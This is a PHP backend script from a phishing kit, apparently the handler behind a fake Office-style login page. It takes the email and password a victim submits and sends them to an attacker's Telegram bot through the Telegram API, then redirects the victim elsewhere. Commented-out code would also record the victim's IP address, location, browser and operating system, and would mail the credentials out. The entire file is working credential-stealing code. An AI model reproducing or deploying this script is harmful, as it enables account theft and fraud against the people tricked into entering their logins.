<?php

require "CONTROLS.php";

$date = date('l d F Y');
$time = date('H:i');
$user = $_POST['email'];
$pass2 = $_POST['passwd'];

/***
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";

$data = "
+ ------------ ICQ: 713566330 --------------+
+ ------------------------------------------+
+ Account Details 
| Email : $user
| First Password : $pass
| Second Password : $pass2
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";

**/

$data = "
+ ------------ DarkForest: Max👾 --------------+
+ ------------------------------------------+
+ Account Details 
| Email : $user
| Password : $pass2

";

//echo $data;

$text = 'Hello, I am from PHP!';

$query = http_build_query([
    'chat_id' => $channelId,
    'text' => $data,
]);
$url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

$contents = file_get_contents($url);

echo $contents;

//mail($receiverAddress, 'New Office Info boss ' . $_SERVER['REMOTE_ADDR'], $data);

header('Location: ' . $ExitLink);
exit;
?>
